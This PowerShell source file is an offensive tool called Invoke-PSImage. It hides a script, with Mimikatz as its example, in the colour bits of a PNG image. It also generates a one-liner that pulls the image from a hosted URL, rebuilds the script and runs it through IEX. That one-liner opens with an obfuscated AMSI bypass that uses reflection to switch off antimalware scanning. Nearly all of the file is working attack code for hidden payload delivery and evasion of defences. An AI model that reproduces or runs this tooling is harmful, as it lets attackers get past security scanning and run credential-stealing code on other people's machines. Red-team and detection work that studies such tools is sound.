function Invoke-PSImage
{
<#
.SYNOPSIS

Embeds a PowerShell script in an image and generates a oneliner to execute it.
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

This tool can either create an image with just the target data, or can embed the payload in
an existing image. When embeding, the least significant 4 bits of 2 color values (2 of RGB) in
each pixel (for as many pixels as are needed for the payload). Image quality will suffer as
a result, but it still looks decent. The image is saved as a PNG, and can be losslessly
compressed without affecting the ability to execute the payload as the data is stored in the
colors themselves. It can accept most image types as input, but output will always be a PNG
because it needs to be lossless.

.PARAMETER Script

The path to the script to embed in the Image.

.PARAMETER Out

The file to save the resulting image to (image will be a PNG)

.PARAMETER Image

The image to embed the script in. (optional)

.PARAMETER WebRequest

Output a command for reading the image from the web using Net.WebClient.
You will need to host the image and insert the URL into the command.

.PARAMETER PictureBox

Output a command for reading the image from the web using System.Windows.Forms.PictureBox.
You will need to host the image and insert the URL into the command.

.EXAMPLE

PS>Import-Module .\Invoke-PSImage.ps1
PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg 
   [Oneliner to execute from a file]
   
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Script,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Out,
    
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Image,

        [switch] $WebClient,
        
        [switch] $PictureBox
    )
    # Stop if we hit an error instead of making more errors
    $ErrorActionPreference = "Stop"

    # Load some assemblies
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
    
    # Normalize paths beacuse powershell is sometimes bad with them.
    if (-Not [System.IO.Path]::IsPathRooted($Script)){
        $Script = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Script))
    }
    if (-Not [System.IO.Path]::IsPathRooted($Out)){
        $Out = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Out))
    }

    $testurl = "http://example.com/" + [System.IO.Path]::GetFileName($Out)

    # Read in the script
    $ScriptBlockString = [IO.File]::ReadAllText($Script)
    $in = [ScriptBlock]::Create($ScriptBlockString)
    $payload = [system.Text.Encoding]::ASCII.GetBytes($in)

    if ($Image) {
        # Normalize paths beacuse powershell is sometimes bad with them.
        if (-Not [System.IO.Path]::IsPathRooted($Image)){
            $Image = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Image))
        }
        
        # Read the image into a bitmap
        $img = New-Object System.Drawing.Bitmap($Image)

        $width = $img.Size.Width
        $height = $img.Size.Height

        # Lock the bitmap in memory so it can be changed programmatically.
        $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
        $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
        $ptr = $bmpData.Scan0

        # Copy the RGB values to an array for easy modification
        $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
        $rgbValues = New-Object byte[] $bytes;
        [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);

        # Check that the payload fits in the image 
        if($bytes/2 -lt $payload.Length) {
            Write-Error "Image not large enough to contain payload!"
            $img.UnlockBits($bmpData)
            $img.Dispose()
            Break
        }

        # Generate a random string to use to fill other pixel info in the picture.
        # (Calling get-random everytime is too slow)
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
        
        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
            if ($counter -lt $payload.Length){
                $paybyte1 = [math]::Floor($payload[$counter]/16)
                $paybyte2 = ($payload[$counter] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            } else {
                $paybyte1 = ($randb[$counter%113] -band 0x0f)
                $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            }
            $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
            $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
            $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
        }

        # Copy the array of RGB values back to the bitmap
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
        $img.UnlockBits($bmpData)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        
        # Get a bunch of numbers we need to use in the oneliner
        $rows = [math]::Ceiling($payload.Length/$width)
        $array = ($rows*$width)
        $lrows = ($rows-1)
        $lwidth = ($width-1)
        $payload = ($payload.Length-1)
        $amsified = @'
        SET  ("{0}{1}"-f'2qF','xA')  ( [tyPe]("{5}{3}{6}{2}{7}{9}{4}{11}{1}{0}{8}{10}" -f'mARs','.','NtIMe.InTer','S','iC','sY','TEM.rU','oPSER','hA','V','L','ES') )  ;$CVK = [TYPe]("{0}{1}" -F'R','eF')  ;${F`wi}= ( gEt-VArIABLE ("{0}{1}"-f'2','qfxA') -ValuEoNLy  )::("{1}{3}{0}{2}"-f 'HGlo','Allo','bal','c').Invoke((9076+8092-8092));$Cvk."asS`eM`BLy"."GeTty`Pe"("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))")."gE`T`FIeLD"("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", ("{1}{3}{0}{4}{2}"-f'ic,','Non','ic','Publ','Stat')).("{2}{1}{0}"-f'lue','etVa','S').Invoke(${nU`Ll}, ${nu`lL}); $cvk."assem`B`Ly"."g`ett`YPE"("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))")."g`EtfI`ELd"("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", ("{3}{4}{2}{1}{0}" -f'tic','blic,Sta','Pu','N','on'))."Se`T`VAluE"(${N`ULl}, [IntPtr]${f`WI});
'@
        $Obufuscation = @'
        .("{0}{1}{2}"-f'se','T-iT','em') ("{2}{0}{1}" -f'iaBlE:6M','4','VaR') (  [tYpE]("{1}{2}{3}{0}"-F 'G','sY','sTEM.TEX','T.eNcodIn') ) ; .("{0}{1}"-f 'I','EX')( $6M4::"as`Cii"."Ge`Tstr`inG"(${O}[0..
'@ + $payload +"]))"
        if($WebClient) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};" + $Obufuscation
        } elseif($PictureBox) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};" + $Obufuscation
        } else {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))}};`$g.Dispose();" + $Obufuscation
        }

        return $pscmd

    } else {
        # Decide how large our image needs to be (always square for easy math)
        $side = ([int] ([math]::ceiling([math]::Sqrt([math]::ceiling($payload.Length / 3)) + 3) / 4)) * 4

        # Decide how large our image needs to be (always square for easy math)
        $rgbValues = New-Object byte[] ($side * $side * 3);
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)

        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length); $counter++) {
            if ($counter -lt $payload.Length){
                $rgbValues[$counter] = $payload[$counter]
            } else {
                $rgbValues[$counter] = $randb[$counter%113]
            }
        }

        # Copy the array of RGB values back to the bitmap
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rgbValues.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $rgbValues.Length)
        $img = New-Object System.Drawing.Bitmap($side, $side, ($side*3), [System.Drawing.Imaging.PixelFormat]::Format24bppRgb, $ptr)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr);
        
        # Get a bunch of numbers we need to use in the oneliner
        $array = ($side*$side)*3
        $lrows = ($side-1)
        $lwidth = ($side-1)
        $width = ($side)
        

        $lpayload = ($payload.Length-1)

        if($WebClient) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};"+ $Obufuscation
        } elseif($PictureBox) {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};" + $Obufuscation
        } else {
            $pscmd = $amsified + "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};`$g.Dispose();" + $Obufuscation
        }

        return $pscmd
    }
}
